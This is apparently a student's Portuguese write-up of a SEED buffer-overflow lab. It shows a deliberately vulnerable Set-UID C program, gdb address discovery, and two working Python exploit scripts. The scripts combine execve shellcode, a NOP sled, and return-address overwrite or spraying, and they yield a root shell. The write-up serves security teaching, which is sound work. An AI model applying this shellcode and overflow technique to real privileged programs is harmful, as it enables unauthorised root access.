# Semana #5 - Buffer-Overflow Attack Lab - Set-UID Version

## Task 1 - Getting familiar with shellcode
![Alt text](image.png)
Esta task familiariza-nos com shellcode. Aprendemos que a melhor maneira para correr shellcode é através de código assembly. Aprendemos, também, um pouco sobre o código assembly utilizado para chamar a função **execve()** e executar `/bin//sh`.
Depois de compilar o ficheiro `call_shellcode.c`, são criados 2 ficheiros:

- `a32.out`, que contém o código em 32 bits
- `a64.out`, que contém o código em 64 bits

Embora o código assembly seja diferente dependendo se é 32 bits ou 64 bits, quando corremos notamos que ambos, de facto, abrem a shell bash e, depois de escrever `whoami`, ambas as bashes respondem com **seed**.


## Task 2 - Understanding the Vulnerable Program

Primeiramente, começamos por compilar o ficheiro `stack.c` e torná-lo num Set-UID program através dos seguintes comandos:

```
sudo chown root stack
```


```
sudo chmod 4755 stack
```

O conteúdo do `stack.c` é o seguinte:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str){
    char buffer[BUF_SIZE];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv){
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```


Alternadamente, podemos simplesmente fazer **make**, pois o `Makefile` já tem as instruções para fazer isto.

Depois de fazer **make**, são criados 4 pares de ficheiros executáveis:

- `stack-L1` e `stack-L1.dbg`
- `stack-L2` e `stack-L2.dbg`
- `stack-L3` e `stack-L3.dbg`
- `stack-L4` e `stack-L4.dbg`

Agora, falta mudar o conteúdo do `badfile` para conseguirmos dar exploit à vulnerabilidade existente.

## Task 3 - Launching Attack on 32-bit Program (Level 1)

Primeiro, temos que criar o ficheiro `badfile`:

```
touch badfile
```

Agora, vamos correr o código em modo debug para conseguirmos descobrir a distância entre a posição inicial do **buffer** e o sítio onde o **return address** está armazenado. Para isso, vamos escrever a seguinte instrução: 

```
gdb stack-L1-dbg
```

Depois de meter um breakpoint na função **bof()**, executar o programa e dar alguns passos para a frente, podemos saber o endereço do **$ebp** da seguinte forma:

```
p $ebp
```

Que retornou `(void *) 0xffffcb18`.<br>
Podemos fazer o mesmo para descobrir o endereço do buffer:

```
p &buffer
```

Que retornou `0xffffcaac`.<br>

Por fim, alteramos o ficheiro `exploit.py` para ter os valores dos endereços obtidos. O ficheiro final ficou assim:

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's (do nothing operation)
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcb18 + 190
offset = 0xffffcb18 - 0xffffcaac + 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Foram necessárias fazer mudanças ao ficheiro original.<br>
Primeiro, mudamos o shellcode para código de 32 bits, que tinha sido dado no ficheiro `call_shellcode.c`.
Depois mudamos o start, que representa o início do shellcode na stack e calculamo-lo subtraindo o tamanho da shellcode ao tamanho lido do badfile, ou seja:

```py
start = 517 - len(shellcode)
```

Finalmente, falta calcular o novo return address, que nos vai levar ao shellcode, e o offset, que representa a distância entre o return address e o início do buffer. Isto é para escrevermos no `badfile`, onde anteriormente estava o return address, um return address novo, que nos levará ao shellcode.
Para calcular o return address basta pegar no valor do **$ebp** e somar um número para que, depois de sair da função, o endereço esteja num local preenchido só por NOP's, que faz com que prossiga até, finalmente, chegar ao shellcode.<br>
Para calcular o offset, temos que subtrair ao **$ebp** o valor do endereço do **buffer** e somar 4, para incluir o antigo return address:

```py
ret    = 0xffffcb18 + 190
offset = 0xffffcb18 - 0xffffcaac + 4
```

Finalmente, corremos o `exploit.py`, que vai criar o `badfile`, seguido do `stack-L1` e obtemos a seguinte mensagem:

```
# <---- Bingo! You’ve got a root shell!
```

## Task 4 - Launching Attack without Knowing Buffer Size (Level 2)


Embora este exercício seja semelhante ao anterior, o facto de não sabermos o tamanho do buffer leva-nos a ter de ter uma approach diferente em relação, especialmente, ao return address. Como não é suposto sabermos o **$ebp**, não conseguimos calcular o offset e, portanto, não conseguimos dar pinpoint à localização do return address que queremos dar override.<br>
Vamos, portanto, ter de recorrer a **spraying**.

**Spraying** consiste em encher o buffer com o novo return address que queremos, pois, assim, mesmo não sabendo o tamanho do `buffer` e, por sua vez, o endereço do return address, como sabemos o tamanho máximo do `buffer` sabemos o endereço máximo que o antigo return address pode ocupar.

O `exploit.py` ficou da seguinte forma:

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's (do nothing operation)
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcaac + 420
#offset = 0xffffcb18 - 0xffffcaac + 4  # Não é necessário para este caso

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

for offset in range(50):
  content[offset*L:offset*L + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Desta vez, como não temos o **$ebp** para calcular o **ret**, usamos o endereço do início do `buffer`, devido a isto o número adicionado tem de ser maior do que o tamanho máximo do `buffer`, que é **200 bytes** e ser alto o suficiente para atingir a zona preenchida por NOP's <br>
Portanto, o novo return address ficou com o valor:

```py
ret = 0xffffcaac + 420
```

Por fim, não podemos calcular onde colocar o novo return address como no exercício anterior, portanto recorremos a **spraying**:

```py
for offset in range(50):
  content[offset*L:offset*L + L] = (ret).to_bytes(L,byteorder='little') 
```

Este **ciclo for** vai colocar em todos os endereços do `buffer` o novo return address, calculado anteriormente.

Desta forma, após correr:

```
./exploit.py
./stack-LX
```

Onde **X** é um número de 1 a 2, conseguimos ter acesso à shell.

**P.S** : É preciso notar que os endereços variam de stack para stack, portanto não serão os mesmos para a stack-L1 e para a stack-L2.
Além disso, as stacks L3 e L4 são de 64 bits, portanto não são relevantes a esta task.
